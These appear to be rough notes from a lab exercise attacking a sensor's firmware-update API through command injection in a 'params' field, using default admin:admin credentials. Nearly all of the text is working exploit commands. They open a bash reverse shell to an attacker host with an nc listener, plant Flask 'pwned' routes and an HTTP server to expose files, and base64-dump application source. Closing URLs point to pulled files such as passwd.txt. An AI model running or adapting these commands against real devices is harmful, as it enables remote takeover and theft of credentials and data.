curl -X POST -u admin:admin -H "Content-Type: application/json" \
     -d '{"firmware_url":"http:///localhost:63999/dummy.sh", "version":"1.2.3", "params":"; echo TEST > /tmp/test.txt"}' \
     http://localhost:12381/firmware/update


# Instructions
> Install curl on sensors

> install `apt-get update && apt-get install -y netcat-traditional` on attacker.

> Enter the attacker bash shell using `docker-compose exec attacker-server /bin/bash`. 

Alternative if above fails:

# Alternative packages if the above fails
```bash
curl -X POST -u admin:admin -H "Content-Type: application/json" \
    -d '{"firmware_url":"http://attacker-server:63999/dummy.sh", "version":"1.2.3", "params":"; apt-get update && apt-get install -y netcat || apt-get install -y netcat-openbsd || apt-get install -y nc"}' \
    http://localhost:12381/firmware/update
```


Run the following on the attacker device:
`I cannot run nc -lvnp 4444 on the attacker instance, how to install nc?`

```bash
nc -lvnp 4444
```

And the following to get ssh access to the temp sensor:
curl -X POST -u admin:admin -H "Content-Type: application/json" \
    -d '{"firmware_url":"http://attacker-server:63999/dummy.sh", "version":"1.2.3", "params":"; bash -c \"bash -i >& /dev/tcp/attacker-server/4444 0>&1\" > /tmp/reverse.log 2>&1 &"}' \
    http://localhost:12382/firmware/update
{
  "command": "/bin/bash /tmp/firmware/dummy.sh ; bash -c \"bash -i >& /dev/tcp/attacker-server/4444 0>&1\" > /tmp/reverse.log 2>&1 &", 
  "message": "Firmware updated successfully", 
  "new_version": "1.2.3", 
  "path": "/tmp/firmware/dummy.sh", 
  "status": "success"
}


-- Other
```bash
curl -X POST -u admin:admin -H "Content-Type: application/json" \
    -d '{"firmware_url":"http://attacker-server:63999/dummy.sh", "version":"1.2.3", "params":"; echo \"from flask import Flask, send_from_directory, send_file\\napp = Flask(__name__)\\n@app.route(\\\"/pwned/<path:filename>\\\")\\ndef serve_pwned(filename):\\n    return send_from_directory(\\\"/tmp/pwned\\\", filename)\\n\\nif __name__ == \\\"__main__\\\":\\n    app.run(host=\\\"0.0.0.0\\\", port=8888)\" > /tmp/pwned_server.py && python /tmp/pwned_server.py > /dev/null 2>&1 &"}' \
    http://localhost:12381/firmware/update
```

curl -X POST -u admin:admin -H "Content-Type: application/json" \
    -d '{"firmware_url":"http://attacker-server:63999/dummy.sh", "version":"1.2.3", "params":"; echo \"from flask import Flask, send_from_directory, send_file\\napp = Flask(__name__)\\n@app.route(\\\"/pwned/<path:filename>\\\")\\ndef serve_pwned(filename):\\n    return send_from_directory(\\\"/tmp/pwned\\\", filename)\\n\\nif __name__ == \\\"__main__\\\":\\n    app.run(host=\\\"0.0.0.0\\\", port=8888)\" > /tmp/pwned_server.py && python /tmp/pwned_server.py > /dev/null 2>&1 &"}' \
    http://localhost:12381/firmware/update

curl -X POST -u admin:admin -H "Content-Type: application/json" \
    -d '{"firmware_url":"http://attacker-server:63999/dummy.sh", "version":"1.2.3", "params":"; cd /tmp/pwned && python -m http.server 8888 > /dev/null 2>&1 &"}' \
    http://localhost:12381/firmware/update


  --

  curl -X POST -u admin:admin -H "Content-Type: application/json" \
    -d '{"firmware_url":"http://attacker-server:63999/dummy.sh", "version":"1.2.3", "params":"; echo \"from flask import send_from_directory\nfrom app import app\n\n@app.route(\"/pwned/<path:filename>\")\ndef pwned_files(filename):\n    return send_from_directory(\\\"/tmp/pwned\\\", filename)\" > /app/pwned_route.py && cd /app && python -c \"import pwned_route\" &"}' \
    http://localhost:12381/firmware/update


--
curl -X POST -u admin:admin -H "Content-Type: application/json" \
    -d '{"firmware_url":"http://attacker-server:63999/dummy.sh", "version":"1.2.3", "params":"; echo \"from flask import send_from_directory\nfrom app import app\n\n@app.route(\"/pwned/<path:filename>\")\ndef pwned_files(filename):\n    return send_from_directory(\\\"/tmp/pwned\\\", filename)\" > /app/pwned_route.py && cd /app && python -c \"import pwned_route\" &"}' \
    http://localhost:12382/firmware/update
----


curl -X POST -u admin:admin -H "Content-Type: application/json" \
    -d '{"firmware_url":"http://attacker-server:63999/dummy.sh", "version":"1.2.3", "params":"; echo \"APP_CONTENT: $(base64 /app/app.py)\""}' \
    http://localhost:12381/firmware/update




curl -X POST -u admin:admin -H "Content-Type: application/json" \
    -d '{"firmware_url":"http://attacker-server:63999/dummy.sh", "version":"1.2.3", "params":"; echo \"APP_CONTENT: $(base64 /app/app.py)\""}' \
    http://172.28.0.4:12380/firmware/update


  http://localhost:12382/pwned/sysinfo.txt
http://localhost:12381:8888/pwned/passwd.txt
http://localhost:12381:8888/pwned/app.py.txt